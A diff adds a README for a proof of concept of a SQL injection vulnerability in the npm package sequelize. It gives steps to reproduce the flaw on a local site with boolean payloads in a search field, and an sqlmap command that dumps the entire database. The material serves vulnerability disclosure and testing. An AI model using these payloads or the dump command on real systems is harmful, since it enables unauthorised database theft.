@@ -1,0 +1,16 @@
+# POC for Vulnerability in NPM package `sequelize`
+
+- **Pull Request**: [#5167](https://github.com/sequelize/sequelize/pull/5167)
+- **Package Repository**: [Sequelize GitHub](https://github.com/sequelize/sequelize)
+- **Package Manager**: [NPM Sequelize](https://www.npmjs.com/package/sequelize)
+
+## Steps to Reproduce:
+
+1. Install the local dependencies: ```npm install```
+2. Start the website locally: ```node index.js```
+3. In the browser, navigate to ```http://localhost:3000```
+4. In the search functionality, input `test1` for the username, and `1 AND 7992=7992`
+5. See that it display 1 user is found.
+6. In the search functionality, input `test1` for the username, and `1 AND 7992=0`
+7. See that it displays 0 user is found. This means that the boolean condition is being executed.
+8. Further injection can be done to retrieve the whole DB content. For example, using `sqlmap`: `sqlmap -r req -p limit --dbms=SQLite --dump --threads 10 --flush-session`
